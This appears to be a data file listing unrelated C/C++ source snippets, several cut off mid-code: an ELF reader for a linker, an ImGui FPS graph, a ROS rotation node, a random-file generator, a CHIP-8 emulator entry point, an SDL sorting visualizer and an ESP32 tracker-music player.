    "#include <iostream>\n#include <vector>\n#include <map>\n#include <set>\n#include <string>\n#include <cstring>\n#include <algorithm>\n#include <iomanip>\n#include <fstream>\n#include <elf.h>\n\nstruct RelocationEntry {\n  int offset; // Offset within the section\n  std::string type = \"R_X86_64_32S\"; // Type of relocation\n  int symbol; // Symbol index in symbol table\n  int addend; // Addend value\n\n  RelocationEntry(int off, int sym, int add)\n    : offset(off), symbol(sym), addend(add) {}\n};\nstd::map<std::string, std::map<int, std::vector<RelocationEntry>>> filesRelocationTables; // key is name of the input file\nstd::map<std::string, std::vector<std::string>> relocationTablesNames; // key is file name, value is vector of section names for that file\n\nstruct SymbolTableEntry {\n  static int currentNum;\n  int num;\n  int value;\n  std::string type;\n  std::string bind;\n  int section_index;\n  std::string name;\n  std::string defined; //used to check if value is valid or not, so decides to put it in flink table\n  SymbolTableEntry(int val, const std::string& typ, const std::string& bin, int sec_index, const std::string& nam, const std::string& def)\n      : num(currentNum++), value(val), type(typ), bind(bin), section_index(sec_index), name(nam), defined(def) {}\n};\nint SymbolTableEntry::currentNum = 0;\nstd::map<std::string, std::vector<SymbolTableEntry>> symbolTables; // key is name of the input file\n\n\nstd::map<std::string, std::map<std::string, std::vector<uint8_t>>> filesSectionsMemory; // Map that holds sections data (like memory from assembler)\n\n\nvoid readELF(std::vector<std::string> inputFiles){\n    for(int i = 0; i < inputFiles.size(); i++){\n        FILE* file = fopen(inputFiles[i].c_str(), \"rb\");\n        if (!file) {\n            std::cerr << \"Failed to open file.\" << std::endl;\n            return;\n        }\n\n        // Get the file size\n        fseek(file, 0, SEEK_END);\n        size_t fileSize = ftell(file);\n        rewind(file);\n\n        // Read the file into a buffer\n        char* elfFile = new char[fileSize];\n        fread(elfFile, 1, fileSize, file);\n        fclose(file);\n\n        //read the ELF header\n        Elf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(elfFile);\n\n\n        //read the section headers\n        Elf64_Shdr* shdr = reinterpret_cast<Elf64_Shdr*>(elfFile + ehdr->e_shoff);\n\n        // Locate the shstrtab\n        char* shstrtab = elfFile + shdr[ehdr->e_shstrndx].sh_offset;\n\n        // Find the .symtab, .strtab, and .rela sections\n        Elf64_Shdr* symtabShdr = nullptr;\n        Elf64_Shdr* strtabShdr = nullptr;\n        std::vector<Elf64_Shdr*> relaShdrs;\n\n        for (int i = 0; i < ehdr->e_shnum; i++) {\n            std::string sectionName = shstrtab + shdr[i].sh_name;\n            if (sectionName == \".symtab\") {\n                symtabShdr = &shdr[i];\n            } else if (sectionName == \".strtab\") {\n                strtabShdr = &shdr[i];\n            } else if (sectionName.find(\".rela\") == 0) {\n                relaShdrs.push_back(&shdr[i]);\n            }\n        }\n\n        std::map<std::string, std::vector<uint8_t>> sectionData;\n        // Loop through each section to store data\n        for (int j = 0; j < ehdr->e_shnum; j++) {\n            std::string sectionName = shstrtab + shdr[j].sh_name;\n            std::vector<uint8_t> data;\n\n            if (shdr[j].sh_type == SHT_PROGBITS) {\n                uint8_t* sectionStart = reinterpret_cast<uint8_t*>(elfFile + shdr[j].sh_offset);\n                data.assign(sectionStart, sectionStart + shdr[j].sh_size);\n                sectionData[sectionName] = data;\n            }\n        }\n        filesSectionsMemory[inputFiles[i]] = sectionData;\n\n        //parsing the symbol table\n        std::vector<SymbolTableEntry> symbolTable;\n        if (symtabShdr && strtabShdr) {\n            Elf64_Sym* symtab = reinterpret_cast<Elf64_Sym*>(elfFile + symtabShdr->sh_offset);\n            char* strtab = elfFile + strtabShdr->sh_offset;\n            int numSymbols = symtabShdr->sh_size / sizeof(Elf64_Sym);\n\n            for (int i = 0; i < numSymbols; ++i) {\n                int value = symtab[i].st_value;\n                int sectionIndex = symtab[i].st_shndx;\n                std::string name = strtab + symtab[i].st_name;\n\n                // Determine bind and type\n                std::string bind = (ELF64_ST_BIND(symtab[i].st_info) == STB_LOCAL) ? \"LOC\" : \"GLOB\";\n                std::string type = (ELF64_ST_TYPE(symtab[i].st_info) == STT_SECTION) ? \"SCTN\" : \"NOTYP\";\n\n                symbolTable.emplace_back(value, type, bind, sectionIndex, name, \"defined\");\n            }\n        }\n        symbolTables[inputFiles[i]] = symbolTable;\n        \n        //parsing relocations tables\n        std::vector<std::string> names; //using this temporary variable to store names of sections for current file \n        std::map<int, std::vector<RelocationEntry>> relocationTables; // key is section number\n        for (auto& relaShdr : relaShdrs) {\n            Elf64_Rela* rela = reinterpret_cast<Elf64_Rela*>(elfFile +",
    "#include \"imgui_fpsGraph.h\"\n#include \"imgui.h\"\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n#include <memory>\n#include <algorithm>\n\nnamespace ImGui {\n\t\n\tvoid FPSGraph::setNumSamples(int n) {\n\t\tfps_num_samples = 20;\n\t\ttimes.resize(fps_num_samples);\n\t\tsortedTimes.resize(fps_num_samples);\n\t}\n\n\tFPSGraph::FPSGraph()\n\t{\n\t\tfps_num_samples = 20;\n\t\tsetNumSamples(20);\n\t\tfps_min_time = 0.6f;\n\t\tfps_vertical_bars = 5;\n\t\t\n\t\tfor (currentSample = 0; currentSample < fps_num_samples; ++currentSample)\n\t\t{\n\t\t\ttimes[currentSample] = 0.0f;\n\t\t}\n\t\ttime = 0.0f;\n\t\tframes = 0;\n\t\tframe_size = ImVec2(100, 100);\n\t\tpadding = 0;\n\t\tborder = 8;\n\t\tmargin = 0;\n\n\t\t//fill = QG::NONE;\n\n\t\theightScale = 0.1f;//100ms\n\n\t\ttpfLast = 0.0f;\n\t\tfpsLast = 0.0f;\n\t\ttpfAverage = 0.0f;\n\t\ttpfMedian = 0.0f;\n\t\ttpfMaximum = 0.0f;\n\t\ttpfMinimum = 0.0f;\n\n\t\tprint = false;\n\t\tgotNewSample = false;\n\t}\n\n\tvoid FPSGraph::updateStats()\n\t{\n\t\tmemcpy(sortedTimes.data(), times.data(), fps_num_samples * sizeof(float));\n\t\tstd::sort(sortedTimes.data(), sortedTimes.data() + fps_num_samples);\n\n\t\ttpfAverage = 0.0f;\n\t\ttpfMaximum = sortedTimes[0];\n\t\ttpfMinimum = sortedTimes[0];\n\t\tfor (int i = 0; i < fps_num_samples; ++i)\n\t\t{\n\t\t\ttpfAverage += sortedTimes[i];\n\t\t\tif (tpfMaximum < sortedTimes[i]) tpfMaximum = sortedTimes[i];\n\t\t\tif (tpfMinimum > sortedTimes[i]) tpfMinimum = sortedTimes[i];\n\t\t}\n\t\ttpfAverage /= fps_num_samples;\n\t\ttpfMedian = sortedTimes[fps_num_samples / 2];\n\t}\n\n\n\tvoid FPSGraph::update(float dt)\n\t{\n\t\ttime += dt;\n\t\t++frames;\n\t\tif (time > fps_min_time)\n\t\t{\n\t\t\ttpfLast = time / frames;\n\t\t\tfpsLast = frames / time;\n\t\t\ttime = 0.0f;\n\t\t\tframes = 0;\n\n\t\t\tcurrentSample = (currentSample + 1) % fps_num_samples;\n\t\t\ttimes[currentSample] = tpfLast;\n\n\t\t\tupdateStats();\n\n\t\t\tif (print)\n\t\t\t\tprintf(\"%.2ffps %.2fms\\n\", 1.0 / tpfLast, 1000.0*tpfLast);\n\n\t\t\tgotNewSample = true;\n\t\t}\n\t\telse\n\t\t\tgotNewSample = false;\n\n\t\tif (tpfMaximum > 0)\n\t\t{\n\t\t\tfloat step = dt * 10000.0;\n\t\t\tfloat targetHeight = 0.6666 / tpfMaximum;\n\t\t\tfloat to = targetHeight - heightScale;\n\t\t\tif (fabs(to) > step)\n\t\t\t\theightScale += step * to / fabs(to);\n\t\t\telse\n\t\t\t\theightScale = targetHeight;\n\t\t}\n\t}\n\n\tbool FPSGraph::Plot(const char * label) {\n\t\tImGuiWindow* window = GetCurrentWindow();\n\t\tif (window->SkipItems)\n\t\t\treturn false;\n\n\t\tImGuiContext & g = *GImGui;\n\t\tconst ImGuiStyle& style = g.Style;\n\t\tconst ImGuiID id = window->GetID(label);\n\n\t\t// draw background\n\t\t//const ImRect frame_bb(\n\t\t//\twindow->DC.CursorPos,\n\t\t//\twindow->DC.CursorPos + frame_size);\n\t\tconst float w = CalcItemWidth();\n\t\tconst ImRect frame_bb(window->DC.CursorPos, window->DC.CursorPos + ImVec2(w, frame_size.y + style.FramePadding.y * 2.0f));\n\t\tconst ImRect inner_bb(\n\t\t\tframe_bb.Min + style.FramePadding,\n\t\t\tframe_bb.Max - style.FramePadding);\n\t\tconst ImRect total_bb = frame_bb;\n\t\tItemSize(total_bb, style.FramePadding.y);\n\t\tif (!ItemAdd(total_bb, 0, &frame_bb))\n\t\t\treturn false;\n\t\tconst bool hovered = ItemHoverable(frame_bb, id);\n\n\t\tRenderFrame(\n\t\t\tframe_bb.Min,\n\t\t\tframe_bb.Max,\n\t\t\tGetColorU32(ImGuiCol_FrameBg),\n\t\t\ttrue,\n\t\t\tstyle.FrameRounding);\n\n\t\tconst float fps30 = 1.0 / 30.0;\n\t\tconst float fps60 = 1.0 / 60.0;\n\t\t//float scalew = frame_size.x /*width*/ / (float)(fps_num_samples - 1);\n\t\tfloat ratew = 1.f / (float)(fps_num_samples - 1);\n\n\t\tfloat offsetx = -time / fps_min_time;\n\t\tImU32 color;\n\n\t\t// graph grid\n\t\tconst int vbarFreq = fps_num_samples / fps_vertical_bars;\n\t\tcolor = GetColorU32(ImVec4(0,1,0,0.5));\n\t\tfloat y0 = inner_bb.Min.y;\n\t\tfloat y1 = inner_bb.Max.y;\n\t\tfor (int i = vbarFreq - currentSample % vbarFreq; i < fps_num_samples; i += vbarFreq)\n\t\t{\n\t\t\tfloat x = i + offsetx;\n\t\t\tif (x < 0.0f) x += 1.0f;\n\t\t\tfloat x0 = ImLerp(inner_bb.Min.x, inner_bb.Max.x, x * ratew);\n\t\t\tImVec2 pos0 = ImVec2(x0, y0);\n\t\t\tImVec2 pos1 = ImVec2(x0, y1);\n\t\t\twindow->DrawList->AddLine(\n\t\t\t\tpos0,pos1,color,1.f\n\t\t\t);\n\t\t}\n\t\t// horizontal bars at 30 and 60 fps\n\t\tcolor = GetColorU32(ImVec4(0.8,0.2,0,0.5));\n\t\tif (fps30 * heightScale <= 1.0) {\n\t\t\tfloat t = 1.f - fps30 * heightScale;\n\t\t\t//float t = fps30 * heightScale;\n\t\t\tfloat y = ImLerp(inner_bb.Min.y, inner_bb.Max.y, t);\n\t\t\tImVec2 pos0 = ImVec2(inner_bb.Min.x, y);\n\t\t\tImVec2 pos1 = ImVec2(inner_bb.Max.x, y);\n\t\t\twindow->DrawList->AddLine(\n\t\t\t\tpos0,pos1,color,1.f\n\t\t\t);\n\t\t}\n\t\tcolor = GetColorU32(ImVec4(0.2, 0.8, 0, 0.5));\n\t\tif (fps60 * heightScale <= 1.0) {\n\t\t\tfloat t = 1.f - fps60 * heightScale;\n\t\t\tfloat y = ImLerp(inner_bb.Min.y, inner_bb.Max.y, t);\n\t\t\tImVec2 pos0 = ImVec2(inner_bb.Min.x, y);\n\t\t\tImVec2 pos1 = ImVec2(inner_bb.Max.x, y);\n\t\t\twindow->DrawList->AddLine(\n\t\t\t\tpos0, pos1, color, 1.f\n\t\t\t);\n\t\t}\n\t\t// graph line\n\t\tcolor = GetColorU32(ImVec4(0, 1, 0, 0.5));\n\t\tImVec2 last,current;\n\t\tfor (int i = 0; i < fps_num_samples; i++) {\n\t\t\tfloat t = times[(currentSample + 1 + i) % fps_num_samples];\n\t\t\tfloat x = i + offsetx;\n\t\t\tif (x < 0.0f) x = 0.0f;\n\t\t\tx = ImLerp(inner_bb.Min.x, inner_bb.Max.x, x * ratew);\n\t\t\tfloat y = ImLerp(inner_bb.Min.y, inner_bb.Max.y, 1 - t * heightScale);\n\t\t\tcurrent = ImVe",
    "#include <ros/ros.h>\n#include <geometry_msgs/Twist.h>\n#include <geometry_msgs/Vector3.h>\n#include <std_msgs/Int32.h>\n#include <std_msgs/Bool.h>\n#include <cmath>\n#include \"pid.h\"\n\n#define LEFT 1\n#define RIGHT -1 \n\nros::Publisher vel_pub, success_pub;\ndouble rotate_speed=0.005;\ngeometry_msgs::Twist target_vel;\nstd_msgs::Bool success_msg;  // \u8868\u793a\u65cb\u8f6c\u6210\u529f\u7684\u6d88\u606f\nint rotate_command = 0;  // \u5f53\u524d\u7684\u65cb\u8f6c\u547d\u4ee4\ndouble target_yaw, current_yaw, initial_yaw;  // \u76ee\u6807\u822a\u5411\u89d2\u3001\u5f53\u524d\u822a\u5411\u89d2\u3001\u521d\u59cb\u822a\u5411\u89d2\nPID pid;  // PID\u63a7\u5236\u5668\u5b9e\u4f8b\n\n// RPY\u6570\u636e\u56de\u8c03\u51fd\u6570\nvoid rpyCallback(const geometry_msgs::Vector3::ConstPtr& msg)\n{\n  // current_yaw = msg->z;  // \u76f4\u63a5\u4f7f\u7528\u4eceimu_rpy\u53d1\u5e03\u7684yaw\u89d2\u5ea6\n\n  // if (rotate_command != 0)\n  // {\n  //   double angle_diff = fabs(current_yaw - target_yaw);\n  //   if (angle_diff > M_PI)  // \u5904\u7406\u89d2\u5ea6\u7684\u73af\u7ed5\u95ee\u9898\n  //     angle_diff = 2 * M_PI - angle_diff;\n\n\n\n  //   ROS_INFO(\"Rotating %s: Current Yaw: %.2f, Target Yaw: %.2f\", rotate_command == LEFT ? \"Left\" : \"Right\", current_yaw, target_yaw);\n    \n  //   // \u68c0\u67e5\u65cb\u8f6c\u662f\u5426\u5728\u5141\u8bb8\u7684\u8303\u56f4\u5185\n  //   if (angle_diff < 0.0053)  // \u7ea6\u7b49\u4e8e0.3\u5ea6\n  //   {\n  //     success_msg.data = true;\n  //     ROS_INFO(\"rotate_success\");\n  //     success_pub.publish(success_msg);  // \u53d1\u5e03\u65cb\u8f6c\u6210\u529f\u7684\u6d88\u606f\n  //     rotate_command = 0;  // \u91cd\u7f6e\u547d\u4ee4\uff0c\u9632\u6b62\u8fdb\u4e00\u6b65\u65cb\u8f6c\n  //   }\n  // }\n}\n\n// \u65cb\u8f6c\u6307\u4ee4\u56de\u8c03\u51fd\u6570\nvoid commandCallback(const std_msgs::Int32::ConstPtr& msg)\n{\n  // rotate_command = msg->data;\n  // initial_yaw = current_yaw;  // \u8bb0\u5f55\u6307\u4ee4\u53d1\u51fa\u65f6\u7684\u822a\u5411\u89d2\n\n  // if (rotate_command == LEFT)\n  //   target_yaw = initial_yaw + M_PI_2; // \u5de6\u8f6c90\u5ea6\u7684\u76ee\u6807\u822a\u5411\u89d2\n  // else if (rotate_command == RIGHT)\n  //   target_yaw = initial_yaw - M_PI_2; // \u53f3\u8f6c90\u5ea6\u7684\u76ee\u6807\u822a\u5411\u89d2\n\n  // // \u5c06\u76ee\u6807\u822a\u5411\u89d2\u5f52\u4e00\u5316\u52300\u52302\u03c0\u4e4b\u95f4\n  // target_yaw = fmod(target_yaw, 2 * M_PI);\n  // if (target_yaw < 0)\n  //   target_yaw += 2 * M_PI;\n\n  // ROS_INFO(\"Received command to rotate %s: Initial Yaw: %.2f, Target Yaw: %.2f\", rotate_command == LEFT ? \"Left\" : \"Right\", initial_yaw, target_yaw);\n}\n\nint main(int argc, char **argv)\n{\n  ros::init(argc, argv, \"rotation_control_node\");\n  ros::NodeHandle nh;\n\n  // \u8bbe\u7f6ePID\u63a7\u5236\u5668\n  pid.setPID(1.0, 0.0, 0.0);\n\n  // \u521d\u59cb\u5316\u53d1\u5e03\u5668\u548c\u8ba2\u9605\u5668\n  vel_pub = nh.advertise<geometry_msgs::Twist>(\"/target_vel_pub\", 10);\n  success_pub = nh.advertise<std_msgs::Bool>(\"/rotation_success\", 10);\n  ros::Subscriber rpy_sub = nh.subscribe(\"/imu_rpy\", 1, rpyCallback);\n  ros::Subscriber cmd_sub = nh.subscribe(\"/rotate_command\", 1, commandCallback);\n\n  ros::spin();\n  return 0;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <cstring>\n#include <random>\n#include \"PagedArray.h\"\n\nvoid generate_file(const std::string& filename, size_t size_in_bytes) {\n    std::ofstream outfile(filename, std::ios::binary);\n    if (!outfile) {\n        std::cerr << \"Error opening file for writing: \" << filename << std::endl;\n        return;\n    }\n\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_int_distribution<int> dis;\n\n    size_t num_integers = size_in_bytes / sizeof(int);\n    for (size_t i = 0; i < num_integers; ++i) {\n        int num = dis(gen);\n        outfile.write(reinterpret_cast<const char*>(&num), sizeof(int));\n    }\n}\n\nint main(int argc, char* argv[]) {\n    std::string size_str;\n    std::string output_file;\n\n    for (int i = 1; i < argc; ++i) {\n        if (std::strcmp(argv[i], \"-size\") == 0 && i + 1 < argc) {\n            size_str = argv[++i];\n        } else if (std::strcmp(argv[i], \"-output\") == 0 && i + 1 < argc) {\n            output_file = argv[++i];\n        }\n    }\n\n    size_t size_in_bytes = 0;\n    if (size_str == \"SMALL\") {\n        size_in_bytes = 512 * 1024 * 1024; // 512 MB\n    } else if (size_str == \"MEDIUM\") {\n        size_in_bytes = 1024 * 1024 * 1024; // 1 GB\n    } else if (size_str == \"LARGE\") {\n        size_in_bytes = 2 * 1024 * 1024 * 1024; // 2 GB\n    } else {\n        std::cerr << \"Invalid size argument: \" << size_str << std::endl;\n        return 1;\n    }\n\n    generate_file(output_file, size_in_bytes);\n    return 0;\n}\n",
    "#include <stdlib.h>\n#include <stdint.h>\n\n#include \"chip8.cpp\"\n\n#define PIXEL_SIZE 10       //the x/y length/height of every pixel on the screen\n#define GL_SILENCE_DEPRECATION      //used for silencing some compiler warnings\n\nusing namespace std;\n\nChip8 cpu = Chip8(&keys);\n\nvoid display(){\n    //auto start = high_resolution_clock::now();\n    glutPostRedisplay();\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    cpu.run();\n    \n    glutSwapBuffers();\n}\n\nvoid resize(int w, int h){\n    glutReshapeWindow(PIXEL_SIZE * 64, PIXEL_SIZE * 32);\n}\n\nvoid setupOpenGL(){\n    glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGBA);\n    glutInitWindowSize(PIXEL_SIZE * 64, PIXEL_SIZE * 32);\n    glutInitWindowPosition(glutGet(GLUT_SCREEN_WIDTH)/2-(PIXEL_SIZE * 32) ,glutGet(GLUT_SCREEN_HEIGHT)/2 - (PIXEL_SIZE * 16));\n    glutCreateWindow(\"CHIP-8\");\n    glClearColor(0, 0, 0, 0);\n    gluOrtho2D(0, PIXEL_SIZE * 64, PIXEL_SIZE * 32, 0);\n    glutDisplayFunc(display);\n    glutReshapeFunc(resize);\n    glutKeyboardFunc(buttonDown);\n    glutKeyboardUpFunc(buttonUp);\n}\n\nint main(int argc, char** argv){\n    cpu.loadBinary(argv[1], true);\n    glutInit(&argc, argv);\n    setupOpenGL();\n    glutMainLoop();\n    return 0;\n}",
    "#include \"fir/SDL.h\"\r\n#include<iostream>\r\n#include<limits>\r\n#include<time.h>\r\n#include<string>\r\n#include <string.h>\r\n\r\nusing namespace std;\r\n\r\nconst int SCREEN_WIDTH=910;\r\nconst int SCREEN_HEIGHT=750;\r\n\r\nconst int arrSize=130;\r\nconst int rectSize=7;\r\n\r\nint arr[arrSize];\r\nint Barr[arrSize];\r\n\r\nSDL_Window* window=NULL;\r\nSDL_Renderer* renderer=NULL;\r\n\r\nbool complete=false;\r\n\r\nbool init()\r\n{\r\n    bool success=true;\r\n    if(SDL_Init(SDL_INIT_VIDEO)<0)\r\n    {\r\n        cout<<\"Couldn't initialize SDL. SDL_Error: \"<<SDL_GetError();\r\n        success=false;\r\n    }\r\n    else\r\n    {\r\n        if(!(SDL_SetHint(SDL_HINT_RENDER_SCALE_QUALITY, \"1\")))\r\n        {\r\n            cout<<\"Warning: Linear Texture Filtering not enabled.\\n\";\r\n        }\r\n\r\n        window=SDL_CreateWindow(\"Sorting Visualizer\", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\r\n        if(window==NULL)\r\n        {\r\n            cout<<\"Couldn't create window. SDL_Error: \"<<SDL_GetError();\r\n            success=false;\r\n        }\r\n        else\r\n        {\r\n            renderer=SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);\r\n            if(renderer==NULL)\r\n            {\r\n                cout<<\"Couldn't create renderer. SDL_Error: \"<<SDL_GetError();\r\n                success=false;\r\n            }\r\n        }\r\n    }\r\n\r\n    return success;\r\n}\r\n\r\nvoid close()\r\n{\r\n    SDL_DestroyRenderer(renderer);\r\n    renderer=NULL;\r\n\r\n    SDL_DestroyWindow(window);\r\n    window=NULL;\r\n\r\n    SDL_Quit();\r\n}\r\n\r\nvoid visualize(int x=-1, int y=-1, int z=-1)\r\n{\r\n    SDL_SetRenderDrawColor(renderer, 0, 0, 0, 0);\r\n    SDL_RenderClear(renderer);\r\n\r\n    int j=0;\r\n    for(int i=0; i<=SCREEN_WIDTH-rectSize; i+=rectSize)\r\n    {\r\n        SDL_PumpEvents();\r\n\r\n        SDL_Rect rect={i, 0, rectSize, arr[j]};\r\n        if(complete)\r\n        {\r\n            SDL_SetRenderDrawColor(renderer, 100, 180, 100, 0);\r\n            SDL_RenderDrawRect(renderer, &rect);\r\n        }\r\n        else if(j==x || j==z)\r\n        {\r\n            SDL_SetRenderDrawColor(renderer, 100, 180, 100, 0);\r\n            SDL_RenderFillRect(renderer, &rect);\r\n        }\r\n        else if(j==y)\r\n        {\r\n            SDL_SetRenderDrawColor(renderer, 165, 105, 189, 0);\r\n            SDL_RenderFillRect(renderer, &rect);\r\n        }\r\n        else\r\n        {\r\n            SDL_SetRenderDrawColor(renderer, 170, 183, 184, 0);\r\n            SDL_RenderDrawRect(renderer, &rect);\r\n        }\r\n        j++;\r\n    }\r\n    SDL_RenderPresent(renderer);\r\n}\r\n\r\nvoid inplaceHeapSort(int* input, int n)\r\n{\r\n    for(int i=1; i<n; i++)\r\n    {\r\n       int childIndex=i;\r\n       int parentIndex=(childIndex-1)/2;\r\n\r\n       while(childIndex>0)\r\n       {\r\n           if(input[childIndex]>input[parentIndex])\r\n           {\r\n               int temp=input[parentIndex];\r\n               input[parentIndex]=input[childIndex];\r\n               input[childIndex]=temp;\r\n\r\n           }\r\n           else\r\n           {\r\n               break;\r\n           }\r\n\r\n           visualize(parentIndex, childIndex);\r\n           SDL_Delay(40);\r\n\r\n           childIndex=parentIndex;\r\n           parentIndex=(childIndex-1)/2;\r\n       }\r\n    }\r\n\r\n    for(int heapLast=n-1; heapLast>=0 ; heapLast--)\r\n    {\r\n        int temp=input[0];\r\n        input[0]=input[heapLast];\r\n        input[heapLast]=temp;\r\n\r\n        int parentIndex=0;\r\n        int leftChildIndex=2*parentIndex + 1;\r\n        int rightChildIndex=2*parentIndex + 2;\r\n\r\n        while(leftChildIndex<heapLast)\r\n        {\r\n            int maxIndex=parentIndex;\r\n\r\n            if(input[leftChildIndex]>input[maxIndex])\r\n            {\r\n                maxIndex=leftChildIndex;\r\n            }\r\n            if(rightChildIndex<heapLast && input[rightChildIndex]>input[maxIndex])\r\n            {\r\n                maxIndex=rightChildIndex;\r\n            }\r\n            if(maxIndex==parentIndex)\r\n            {\r\n                break;\r\n            }\r\n\r\n            int temp=input[parentIndex];\r\n            input[parentIndex]=input[maxIndex];\r\n            input[maxIndex]=temp;\r\n\r\n            visualize(maxIndex, parentIndex, heapLast);\r\n            SDL_Delay(40);\r\n\r\n            parentIndex=maxIndex;\r\n            leftChildIndex=2*parentIndex + 1;\r\n            rightChildIndex=2*parentIndex + 2;\r\n        }\r\n    }\r\n}\r\n\r\nint partition_array(int a[], int si, int ei)\r\n{\r\n    int count_small=0;\r\n\r\n    for(int i=(si+1);i<=ei;i++)\r\n    {\r\n        if(a[i]<=a[si])\r\n        {\r\n            count_small++;\r\n        }\r\n    }\r\n    int c=si+count_small;\r\n    int temp=a[c];\r\n    a[c]=a[si];\r\n    a[si]=temp;\r\n    visualize(c, si);\r\n\r\n    int i=si, j=ei;\r\n\r\n    while(i<c && j>c)\r\n    {\r\n        if(a[i]<= a[c])\r\n        {\r\n            i++;\r\n        }\r\n        else if(a[j]>a[c])\r\n        {\r\n            j--;\r\n        }\r\n        else\r\n        {\r\n            int temp_1=a[j];\r\n            a[j]=a[i];\r\n            a[i]=temp_1;\r\n\r\n            visualize(i, j);\r\n            SDL_Delay(70);\r\n\r\n            i++;\r\n            j--;\r\n        }\r\n    }\r\n    return c;\r\n",
    "#include <Arduino.h>\n#include <driver/i2s_std.h>\n#include <esp_spiffs.h>\n#include <Adafruit_SSD1306.h>\n// #include \"debug_memory.h\"\n#include \"SerialTerminal.h\"\n#include \"it_file.h\"\n#include \"extra_func.h\"\n#include \"channel.h\"\n#include \"vol_table.h\"\n#include \"it_config.h\"\n#include \"write_wav.h\"\n\nAdafruit_SSD1306 display(128, 64, &SPI, 7, 15, 6, 10000000);\n\naudio_stereo_32_t audioBuffer[BUFF_SIZE];\n\ni2s_chan_handle_t i2s_tx_handle;\ni2s_chan_config_t i2s_chan_cfg = I2S_CHANNEL_DEFAULT_CONFIG(I2S_NUM_AUTO, I2S_ROLE_MASTER);\ni2s_std_config_t i2s_std_cfg = {\n    .clk_cfg = I2S_STD_CLK_DEFAULT_CONFIG(SMP_RATE),\n    .slot_cfg = I2S_STD_MSB_SLOT_DEFAULT_CONFIG(I2S_DATA_BIT_WIDTH_32BIT, I2S_SLOT_MODE_STEREO),\n    .gpio_cfg = {\n        .mclk = I2S_GPIO_UNUSED,\n        .bclk = GPIO_NUM_42,\n        .ws = GPIO_NUM_40,\n        .dout = GPIO_NUM_41,\n        .din = I2S_GPIO_UNUSED,\n        .invert_flags = {\n            .mclk_inv = false,\n            .bclk_inv = false,\n            .ws_inv = false,\n        },\n    },\n};\n\nit_header_t it_header;\nit_instrument_t *it_instrument;\nit_sample_t *it_samples;\npattern_note_t ***unpack_data; // unpack_data[PatNum][Channel][Rows].note_data\nuint16_t *maxChlTable;\nuint16_t *maxRowTable;\n\nint16_t tracker_rows = 0;\nint16_t tracker_ords = 0;\nuint8_t tracker_pats = 0;\n\nit_unpack_envelope_t *inst_envelope;\n\nuint8_t TicksRow;\nuint16_t TempoTickMax;\n\nuint8_t actvChan = 0;\n\nChannel* channels;\n\nuint8_t GlobalVol;\n\nuint16_t maxChannel = 0;\n\nvoid get_track(int argc, const char* argv[]) {\n    if (argc < 6) {\n        printf(\"%s <Pat> <ChlStart> <ChlEnd> <RowStart> <RowEnd>\\n\", argv[0]);\n        return;\n    }\n    uint16_t pat = strtol(argv[1], NULL, 0);\n    uint16_t chlstart = strtol(argv[2], NULL, 0);\n    uint16_t chlend = strtol(argv[3], NULL, 0);\n    uint16_t rowstart = strtol(argv[4], NULL, 0);\n    uint16_t rowend = strtol(argv[5], NULL, 0);\n    printf(\"ROWS |\");\n    for (uint16_t i = chlstart; i < chlend; i++) {\n            printf(\"   Channel%02d   |Mask|\", i);\n    }\n    printf(\"\\n\");\n    for (uint16_t i = chlstart; i < chlend; i++) {\n            printf(\"----------------------\", i);\n    }\n    printf(\"\\n\");\n    for (uint16_t row_index = rowstart; row_index < rowend; row_index++) {\n        printf(\"%03d: |\", row_index);\n        for (uint16_t chl_index = chlstart; chl_index < chlend; chl_index++) {\n            char note_tmp[4] = \"---\";\n            uint8_t mask = unpack_data[pat][chl_index][row_index].mask;\n            if (GET_NOTE(mask)) {\n                midi_note_to_string(unpack_data[pat][chl_index][row_index].note, note_tmp);\n                printf(\"%s \", note_tmp);\n            } else {\n                printf(\"... \");\n            }\n\n            if (GET_INSTRUMENT(mask)) {\n                printf(\"%02d \", unpack_data[pat][chl_index][row_index].instrument);\n            } else {\n                printf(\".. \");\n            }\n\n            if (GET_VOLUME(mask)) {\n                uint8_t vtmp;\n                char stat;\n                volCmdToRel(unpack_data[pat][chl_index][row_index].volume, &stat, &vtmp);\n                printf(\"%c%02d \", stat, vtmp);\n            } else {\n                printf(\"... \");\n            }\n\n            if (GET_COMMAND(mask)) {\n                printf(\"%c%02x \", unpack_data[pat][chl_index][row_index].command + 64,\n                                    unpack_data[pat][chl_index][row_index].command_value);\n            } else {\n                printf(\"... \");\n            }\n\n            printf(\"|0x%02x|\", unpack_data[pat][chl_index][row_index].mask);\n        }\n        printf(\"\\n\");\n    }\n}\n\nvoid get_free_heap_cmd(int argc, const char* argv[]) {\n    printf(\"Free heap size: %ld\\n\", esp_get_free_heap_size());\n}\n\nvoid get_env_cmd(int argc, const char* argv[]) {\n    if (argc < 2) {\n        printf(\"%s <instNum>\\n\", argv[0]);\n        return;\n    }\n    uint8_t instNum = strtol(argv[1], NULL, 0);\n    printf(\"TICK | Y\\n\");\n    for (uint8_t i = 0; i < it_instrument[instNum].volEnv.Num; i++) {\n        printf(\"%04d | %02d\\n\", it_instrument[instNum].volEnv.envelope[i].tick, it_instrument[instNum].volEnv.envelope[i].y);\n    }\n}\n\nvoid get_env_itp_cmd(int argc, const char* argv[]) {\n    if (argc < 3) {\n        printf(\"%s <instNum> <tick>\\n\", argv[0]);\n        return;\n    }\n    uint8_t instNum = strtol(argv[1], NULL, 0);\n    uint16_t tick = strtol(argv[2], NULL, 0);\n    int8_t y = 0;// get_env_y(&it_instrument[instNum].volEnv, tick);\n    printf(\"TICK%d = ENV%d\\n\", tick, y);\n}\n\nvoid reboot_cmd(int argc, const char* argv[]) {\n    esp_restart();\n}\n\n/*\nvoid get_heap_stat(int argc, const char* argv[]) {\n    view_heap_status();\n}\n*/\n\nvoid play_samp_cmd(int argc, const char* argv[]) {\n    if (argc < 3) {\n        printf(\"%s <SmpNum> <note> <s>\\n\", argv[0]);\n        return;\n    }\n    /*\n    size_t writed;\n    uint16_t buffPoint = 0;\n    uint16_t smp_num = 